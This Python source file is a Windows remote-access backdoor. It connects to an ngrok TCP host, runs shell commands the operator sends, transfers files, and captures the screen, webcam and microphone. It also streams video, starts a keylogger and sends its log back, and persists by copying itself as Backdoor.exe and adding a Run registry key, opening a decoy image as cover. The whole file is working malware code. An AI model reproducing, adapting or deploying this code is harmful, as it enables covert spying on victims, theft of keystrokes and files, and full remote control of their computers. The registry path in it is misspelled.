# import base64
import ctypes
# import json
# import multiprocessing
import os
import pickle
import shutil
import socket
import struct
import subprocess
import sys
import threading
import time
import webbrowser

import cv2
import imutils
import mss
import requests
import sounddevice
from scipy.io.wavfile import write

import keylogger

# def reliable_send(data):
#     try:
#         data = json.dumps(data)
#         data= data.encode()
#     except :
#         pass
#     print(data)
#     sock.send(data)


# def reliable_recv():
#     json_data = ""
#     while True:
#         try:
#             json_data = json_data+(sock.recv(1024)).decode()
#             return json.loads(json_data)
#         except ValueError:
#             continue

def reliable_send(msg):
    # Prefix each message with a 4-byte length (network byte order)
    print(msg)
    msg = msg.encode()
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)


def send_file(msg):
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)


def recv_file():
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    result = recvall(sock, msglen)
    return result


def reliable_recv():
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    result = recvall(sock, msglen).decode()
    return result


def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data


def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join(
            [os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
    except:
        admin = ("[!!] User privileges")
    else:
        admin = ("[+] Root privileges")


def screenshot():
    output_filename = 'screenshot.png'
    with mss.mss() as screenshot:
        screenshot.shot(output=output_filename)


def cam_snap():
    c = cv2.VideoCapture(0)  # zero to use the first camera available
    check, img = c.read()  # tells us if we really got the image
    cv2.imwrite("cam.png", img)
    del(c)


def cam_video(duration):
    video = cv2.VideoCapture(0)
    t0 = time.time()
    fourcc = cv2.VideoWriter_fourcc(*'xvid')
    out = cv2.VideoWriter('vid.mp4', fourcc, 20.0, (640, 480))
    while True:
        check, frame = video.read()
        if (check == True):
            out.write(frame)
        else:
            break
        t1 = time.time()  # current time
        num_seconds = t1 - t0
        if num_seconds > duration:  # break after 5 seconds
            break
    video.release()
    cv2.destroyAllWindows()


def mic_record(duration):
    fps = 44100
    print('Recording...')
    recording = sounddevice.rec(int(duration*fps), samplerate=fps, channels=2)
    sounddevice.wait()
    print("Done.")
    write("mic.wav", fps, recording)


def get(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def stream(stop):
    while True:
        vid = cv2.VideoCapture(0, cv2.CAP_DSHOW)

        while(vid.isOpened()):
            img, frame = vid.read()
            frame = imutils.resize(frame, width=320)
            a = pickle.dumps(frame)
            message = struct.pack("Q", len(a))+a
            sock.sendall(message)

            # cv2.imshow('TRANSMITTING VIDEO',frame)
            key = cv2.waitKey(1) & 0xFF
            if key == ord('q') or stop():
                vid.release()
                cv2.destroyAllWindows()
                break
        if stop():
            break


# def connection():
#     while True:
#         time.sleep(20)
#         try:
#             sock.connect(("10.188.74.185", 9001))
#             print("connected")
#             shell()
#         except:
#             connection()


def shell():
    stop_threads = False
    stream_thread = threading.Thread(target=stream, args=(lambda: stop_threads, ))

    while True:
        command = reliable_recv()
        print(command)
        if command == "q":
            break

        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                reliable_send("[!!] Failed to change directory")
                continue

        elif command[:3] == "pwd":
            try:
                wd = os.getcwd()
                reliable_send(wd)
            except:
                reliable_send("[!!] Failed to print working directory")
                pass

        elif command[:8] == "download":
            try:
                with open(command[9:], "rb") as file:
                    send_file(file.read())
            except:
                reliable_send("[!!] Failed to send file")

        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                result = recv_file()
                fin.write(result)

        elif command[:3] == "get":
            try:
                get(command[4:])
                reliable_send("[+] Downloaded file from specified URL")
            except:
                reliable_send("[!!] Failed to download file")

        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("screenshot.png", "rb") as sc:
                    img = sc.read()
                    send_file(img)
                    print("screenshoted")
                os.remove("screenshot.png")
            except:
                reliable_send("[!!] Failed to take screenshot")

        elif command[:8] == "cam_snap":
            try:
                cam_snap()
                with open("cam.png", "rb") as sc:
                    img = sc.read()
                    send_file(img)
                    print("cam snapped")
                os.remove("cam.png")
            except:
                reliable_send("[!!] Failed to take camera snap")

        elif command[:5] == "video":
            try:
                cam_video(int(command[6:]))
                with open("vid.mp4", "rb") as sc:
                    img = sc.read()
                    send_file(img)
                    print("video recorded")
                os.remove("vid.mp4")
            except:
                reliable_send("[!!] Failed to take a video capture")

        elif command[:3] == "mic":
            try:
                mic_record(int(command[4:]))
                with open("mic.wav", "rb") as sc:
                    img = sc.read()
                    send_file(img)
                    print("mic recorded")
                os.remove("mic.wav")
            except:
                reliable_send("[!!] Failed to record mic")

        elif command[:6] == "stream":
            stream_thread.start()

        elif command[:11] == "stop_stream":
            stop_threads = True
            stream_thread.join()

        elif command[:6] == "keylog":
            t1 = threading.Thread(target=keylogger.start)
            t1.setDaemon(True)
            t1.start()

        elif command[:11] == "dump_keylog":
            with open("logger.txt", "rb") as sc:
                img = sc.read()
                send_file(img)

        elif command[:5] == "check":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send("[!!] Failed to check")

        elif command[:9] == "wallpaper":
            try:
                path = command[10:]
                res = ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
                if res == 1:
                    reliable_send("[+] Wallpaper changed successfully")
                else:
                    reliable_send("[!!] Failed to change the wallpaper")
            except:
                reliable_send("[!!] Failed to change the wallpaper")

        elif command[:10] == "webbrowser":
            try:
                url = command[11:]
                res = webbrowser.open(url)
                if res == True:
                    reliable_send("[+] Web browser opened successfully")
                else:
                    reliable_send("[!!] Failed to open web browser")
            except:
                reliable_send("[!!] Failed to open web browser")

        elif command[:11] == "persistance":
            location = os.environ["appdata"] + "\\Backdoor.exe"
            if not os.path.exists(location):
                shutil.copyfile(sys.executable, location)
                subprocess.call(
                    'reg add HKCU\Software\Microsoft\Windows\CurrentVirsion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
                name = sys._MEIPASS + "\hinata.jpg"
                try:
                    subprocess.Popen(name, shell=True)
                except:
                    num = 3
                    nb = 1
                    addition = num+nb

        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE, universal_newlines=True)
                result = proc.stdout.read()+proc.stderr.read()
                print(result, type(result))
                reliable_send(result)
            except:
                reliable_send("[!!] cant execute the command")


# location = os.environ["appdata"] + "\\Backdoor.exe"
# if not os.path.exists(location):
#     shutil.copyfile(sys.executable, location)
#     subprocess.call(
#         'reg add HKCU\Software\Microsoft\Windows\CurrentVirsion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
#     name = sys._MEIPASS + "\hinata.jpg"
#     try:
#         subprocess.Popen(name, shell=True)
#     except:
#         num = 3
#         nb = 1
#         addition = num+nb

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connection()
sock.connect(("8.tcp.ngrok.io", 17655))  # ngrok tcp 9001
print("connected")
shell()
sock.close()
